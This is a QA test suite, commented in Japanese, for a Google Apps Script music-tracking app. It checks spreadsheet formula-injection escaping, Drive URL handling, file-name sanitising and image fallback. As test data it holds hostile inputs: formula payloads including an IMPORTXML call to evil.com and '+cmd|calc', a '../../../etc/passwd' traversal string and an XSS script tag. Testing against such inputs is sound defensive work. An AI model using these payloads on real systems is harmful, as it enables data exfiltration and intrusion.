/**
 * QAエンジニア 包括的障害・境界値・セキュリティ検証スイート
 */
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const DriveService = require('../src/DriveService.js');
const MusicService = require('../src/MusicService.js');
const SheetService = require('../src/SheetService.js');

// ScriptsUtils.html のロード
const utilsContent = fs.readFileSync(path.join(__dirname, '../src/ScriptsUtils.html'), 'utf8');
const scriptTagRegex = /<script>([\s\S]*?)<\/script>/;
const utilsJs = (utilsContent.match(scriptTagRegex) || [])[1];
const utilsSandbox = {};
vm.createContext(utilsSandbox);
vm.runInContext(utilsJs + '\nthis.Utils = Utils;', utilsSandbox);
const Utils = utilsSandbox.Utils;

console.log('===============================================================');
console.log('QAエンジニア 包括的障害・境界値・セキュリティ検証スイート開始');
console.log('===============================================================');

let passCount = 0;
let failCount = 0;
const issues = [];

function test(name, fn) {
  try {
    fn();
    passCount++;
    console.log(`  [PASS] ${name}`);
  } catch (err) {
    failCount++;
    console.error(`  [FAIL] ${name}: ${err.message}`);
    issues.push({ name, error: err });
  }
}

// -------------------------------------------------------------
// セクション 1: スプレッドシート式インジェクション検証 (NFR-SEC-002)
// -------------------------------------------------------------
console.log('\n>>> [1] スプレッドシート式インジェクション検証 (artworkUrl)');

test('MusicService.saveSingleTrack: artworkUrl に = で始まる数式が指定された場合にエスケープされるか', () => {
  let savedPayload = null;
  const mockSheet = {
    appendSingleTrack: (p) => { savedPayload = p; return p; }
  };
  const mockDrive = {
    ensurePublicArtwork: (url) => url // 未変更で返す
  };
  const ms = new MusicService({}, mockSheet, mockDrive, {});
  
  ms.saveSingleTrack({
    albumArtist: 'Test Artist',
    albumName: 'Test Album',
    trackArtist: 'Test Artist',
    trackName: 'Test Track',
    artworkUrl: '=SUM(1,2)'
  });
  
  assert.strictEqual(
    savedPayload.artworkUrl.startsWith("'="),
    true,
    `artworkUrl はシングルクォートで無害化されているべきだが、実際は: "${savedPayload.artworkUrl}"`
  );
});

test('SheetService.appendSingleTrack: artworkUrl に @, +, - で始まる文字列が渡された場合にエスケープされるか', () => {
  let sheetRow = null;
  global.SpreadsheetApp = {
    openById: () => ({
      getSheetByName: () => ({
        getLastRow: () => 1,
        appendRow: (row) => { sheetRow = row; }
      })
    })
  };
  const ss = new SheetService({ getSpreadsheetId: () => 'dummy', getSheetName: () => 'MusicTracks' });

  const maliciousUrls = ['@SUM(1,2)', '+cmd|calc', '-1+2', '=cmd'];
  for (const url of maliciousUrls) {
    ss.appendSingleTrack({
      albumArtist: 'Artist',
      albumName: 'Album',
      trackArtist: 'Artist',
      trackName: 'Track',
      artworkUrl: url
    });
    assert.strictEqual(
      sheetRow[7].startsWith("'"),
      true,
      `SheetService.appendSingleTrack の H列 (${url}) は無害化されるべきだが、実際は: "${sheetRow[7]}"`
    );
  }
});

test('SheetService.insertTracksBatch: driveArtworkUrl に = で始まる文字列が渡された場合にエスケープされるか', () => {
  let sheetValues = null;
  global.SpreadsheetApp = {
    openById: () => ({
      getSheetByName: () => ({
        getLastRow: () => 1,
        getRange: () => ({
          setValues: (vals) => { sheetValues = vals; }
        })
      })
    })
  };
  const ss = new SheetService({ getSpreadsheetId: () => 'dummy', getSheetName: () => 'MusicTracks' });

  ss.insertTracksBatch(
    [{ cdNumber: 1, trackNumber: 1, trackName: 'T1' }],
    { albumName: 'Alb', albumArtist: 'Art', releaseDate: '2026-01-01' },
    '=IMPORTXML("http://evil.com","//a")'
  );

  assert.strictEqual(
    sheetValues[0][7].startsWith("'="),
    true,
    `SheetService.insertTracksBatch の H列 は無害化されるべきだが、実際は: "${sheetValues[0][7]}"`
  );
});

// -------------------------------------------------------------
// セクション 2: DriveService.ensurePublicArtwork の極限値・異常系検証
// -------------------------------------------------------------
console.log('\n>>> [2] DriveService.ensurePublicArtwork の極限値・異常系検証');

const driveService = new DriveService({ getDriveFolderId: () => 'folder_123' });

test('ensurePublicArtwork: rawUrl が null / undefined / 空文字 / 空白のみ', () => {
  assert.strictEqual(driveService.ensurePublicArtwork(null, 'Album'), '');
  assert.strictEqual(driveService.ensurePublicArtwork(undefined, 'Album'), '');
  assert.strictEqual(driveService.ensurePublicArtwork('', 'Album'), '');
  assert.strictEqual(driveService.ensurePublicArtwork('   ', 'Album'), '');
});

test('ensurePublicArtwork: rawUrl が非文字列型 (数値, オブジェクト, 配列, boolean)', () => {
  assert.strictEqual(driveService.ensurePublicArtwork(12345, 'Album'), '');
  assert.strictEqual(driveService.ensurePublicArtwork({}, 'Album'), '');
  assert.strictEqual(driveService.ensurePublicArtwork([], 'Album'), '');
  assert.strictEqual(driveService.ensurePublicArtwork(true, 'Album'), '');
});

test('ensurePublicArtwork: 各種 Google Drive URL 形式から正規化公開URLが生成されるか', () => {
  const fileId = '1a2b3c4d5e6f7g8h9i0j1k2l3m4n';
  const patterns = [
    `https://drive.google.com/file/d/${fileId}/view?usp=sharing`,
    `https://drive.google.com/open?id=${fileId}`,
    `https://drive.google.com/uc?id=${fileId}&export=download`,
    `https://drive.google.com/thumbnail?id=${fileId}&sz=w400`,
    `https://lh3.googleusercontent.com/d/${fileId}`,
    fileId
  ];

  for (const p of patterns) {
    const res = driveService.ensurePublicArtwork(p, 'Album');
    assert.strictEqual(res, `https://lh3.googleusercontent.com/d/${fileId}`);
  }
});

test('ensurePublicArtwork: DriveApp が存在し getFileById で例外が発生した場合でも処理が中断しないか (Graceful Degradation)', () => {
  global.DriveApp = {
    Access: { ANYONE_WITH_LINK: 'ANYONE_WITH_LINK' },
    Permission: { VIEW: 'VIEW' },
    getFileById: (id) => {
      throw new Error('Access denied (403): User does not have permission');
    }
  };

  const fileId = '1a2b3c4d5e6f7g8h9i0j1k2l3m4n';
  const res = driveService.ensurePublicArtwork(fileId, 'Album');
  assert.strictEqual(res, `https://lh3.googleusercontent.com/d/${fileId}`);
  delete global.DriveApp;
});

test('ensurePublicArtwork: DriveApp が存在し setSharing で例外が発生した場合でも処理が中断しないか', () => {
  global.DriveApp = {
    Access: { ANYONE_WITH_LINK: 'ANYONE_WITH_LINK' },
    Permission: { VIEW: 'VIEW' },
    getFileById: (id) => ({
      setSharing: () => {
        throw new Error('Cannot share outside domain');
      }
    })
  };

  const fileId = '1a2b3c4d5e6f7g8h9i0j1k2l3m4n';
  const res = driveService.ensurePublicArtwork(fileId, 'Album');
  assert.strictEqual(res, `https://lh3.googleusercontent.com/d/${fileId}`);
  delete global.DriveApp;
});

test('downloadAndSaveArtwork: UrlFetchApp が HTTP 404 / 500 を返した場合は空文字を返却しクラッシュしないこと', () => {
  global.DriveApp = {
    getFolderById: () => ({
      createFile: () => {}
    })
  };
  global.UrlFetchApp = {
    fetch: () => ({
      getResponseCode: () => 404
    })
  };

  const res = driveService.downloadAndSaveArtwork('https://example.com/notfound.jpg', 'Album');
  assert.strictEqual(res, '');
  delete global.DriveApp;
  delete global.UrlFetchApp;
});

test('downloadAndSaveArtwork: UrlFetchApp.fetch が例外（タイムアウト・DNSエラー）を起こした場合に空文字を返却しクラッシュしないこと', () => {
  global.DriveApp = {
    getFolderById: () => ({
      createFile: () => {}
    })
  };
  global.UrlFetchApp = {
    fetch: () => {
      throw new Error('DNS failure or connection timeout');
    }
  };

  const res = driveService.downloadAndSaveArtwork('https://invalid-host-name-123.com/art.jpg', 'Album');
  assert.strictEqual(res, '');
  delete global.DriveApp;
  delete global.UrlFetchApp;
});

test('sanitizeFileName: ディレクトリトラバーサル・危険文字・NULLバイトの完全無害化', () => {
  assert.strictEqual(driveService.sanitizeFileName('../../../etc/passwd'), 'etc_passwd');
  assert.strictEqual(driveService.sanitizeFileName('album\0name'), 'albumname');
  assert.strictEqual(driveService.sanitizeFileName('foo/bar\\baz:qux*?<>|'), 'foo_bar_baz_qux');
  assert.strictEqual(driveService.sanitizeFileName(''), 'album');
  assert.strictEqual(driveService.sanitizeFileName(null), 'album');
  assert.strictEqual(driveService.sanitizeFileName('   '), 'album');
});

// -------------------------------------------------------------
// セクション 3: フロントエンド ScriptsUtils / handleImageError 多重フォールバック検証
// -------------------------------------------------------------
console.log('\n>>> [3] フロントエンド ScriptsUtils / handleImageError 検証');

test('Utils.resolveArtworkUrl: XSS 攻撃文字列がそのまま混入しないか (抽出されない場合)', () => {
  const xssUrl = '"><script>alert(1)</script>';
  const res = Utils.resolveArtworkUrl(xssUrl);
  assert.strictEqual(res, xssUrl);
});

test('Utils.handleImageError: 偽造されたDOM要素や不正プロパティへの耐性', () => {
  assert.doesNotThrow(() => Utils.handleImageError(null));
  
  const dummyEl = {
    attributes: {},
    getAttribute(k) { return this.attributes[k] || null; },
    setAttribute(k, v) { this.attributes[k] = v; },
    removeAttribute(k) { delete this.attributes[k]; },
    src: '',
    onerror: () => {}
  };
  
  Utils.handleImageError(dummyEl);
  assert.strictEqual(dummyEl.attributes['data-error-step'], '2');
  assert.strictEqual(dummyEl.onerror, null);
  assert.strictEqual(dummyEl.src.startsWith('data:image/svg+xml'), true);
});

test('Utils.handleImageError: Drive画像の場合 Step 0 -> Step 1 -> Step 2 の完全ライフサイクル遷移', () => {
  const fileId = '1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms';
  const imgEl = {
    attributes: {
      'data-artwork': `https://drive.google.com/file/d/${fileId}/view`,
      'data-error-step': '0'
    },
    getAttribute(k) { return this.attributes[k] || null; },
    setAttribute(k, v) { this.attributes[k] = v; },
    removeAttribute(k) { delete this.attributes[k]; },
    src: `https://lh3.googleusercontent.com/d/${fileId}`,
    onerror: () => {}
  };

  // 1回目のエラー (Step 0 -> Step 1: thumbnailへ)
  Utils.handleImageError(imgEl);
  assert.strictEqual(imgEl.attributes['data-error-step'], '1');
  assert.strictEqual(imgEl.src, `https://drive.google.com/thumbnail?id=${fileId}&sz=w400`);
  assert.notStrictEqual(imgEl.onerror, null);

  // 2回目のエラー (Step 1 -> Step 2: SVGへ & onerror解除)
  Utils.handleImageError(imgEl);
  assert.strictEqual(imgEl.attributes['data-error-step'], '2');
  assert.strictEqual(imgEl.onerror, null);
  assert.strictEqual(imgEl.attributes['data-artwork'], undefined);
  assert.strictEqual(imgEl.src.startsWith('data:image/svg+xml'), true);

  // 3回目の呼び出し (万一発火しても onerror=null で守られ、Step 2維持)
  Utils.handleImageError(imgEl);
  assert.strictEqual(imgEl.attributes['data-error-step'], '2');
});

// -------------------------------------------------------------
// セクション 4: 既存機能・回帰検証 (AC-007)
// -------------------------------------------------------------
console.log('\n>>> [4] 既存機能・回帰検証 (AC-007)');

test('MusicService.saveAlbumFromItunes: 正常なペイロードで登録が成功すること', () => {
  let batchInserted = false;
  const mockSheet = {
    insertTracksBatch: (tracks, meta, artUrl) => {
      batchInserted = true;
      return tracks.length;
    }
  };
  const mockDrive = {
    downloadAndSaveArtwork: () => 'https://drive.google.com/thumbnail?id=test12345&sz=w800'
  };
  const ms = new MusicService({}, mockSheet, mockDrive, {});

  const res = ms.saveAlbumFromItunes({
    albumName: 'Test Album',
    albumArtist: 'Test Artist',
    releaseDate: '2026-01-01',
    artworkUrl500: 'https://is1-ssl.mzstatic.com/image/thumb/art.jpg/500x500bb.jpg',
    tracks: [
      { cdNumber: 1, trackNumber: 1, trackName: 'Song 1', trackArtist: 'Test Artist' }
    ]
  });

  assert.strictEqual(batchInserted, true);
  assert.strictEqual(res.count, 1);
  assert.strictEqual(res.savedAlbum, 'Test Album');
});

console.log('\n===============================================================');
console.log(`QA検証完了: 成功 = ${passCount}, 失敗 = ${failCount}`);
console.log('===============================================================');

if (issues.length > 0) {
  console.log('\n発見された課題一覧:');
  issues.forEach(i => console.log(`- ${i.name}: ${i.error.message}`));
}
